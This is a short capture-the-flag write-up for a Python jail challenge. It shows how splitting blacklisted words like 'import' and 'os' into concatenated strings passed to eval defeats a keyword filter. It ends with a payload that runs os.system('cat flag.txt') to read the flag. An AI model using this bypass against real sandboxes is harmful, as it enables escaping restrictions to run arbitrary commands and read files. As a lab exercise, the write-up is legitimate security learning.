Challenge: genericpyjail

When has a blacklist of insecure keywords EVER failed?

This challenge had a long blacklist of words/functions which would cause the connection to end, but wasnt hard to get around

import
ast
eval

pickle
os
subprocess

Solution:

some thinking and testing made me realize that eval will allow me to concatenate strings and then send that to the intepreter 
SOOOOO

"impor" + "t o" + "s"
"prin" + "t(o" + "s.getcwd())" --- this outputs root but was how I tested the functionality
"prin" + "t(o" + "s.sy" + "stem('cat flag.txt'))" -- gives the flag

flag{bl4ckl1sts_w0rk_gre3344T!}
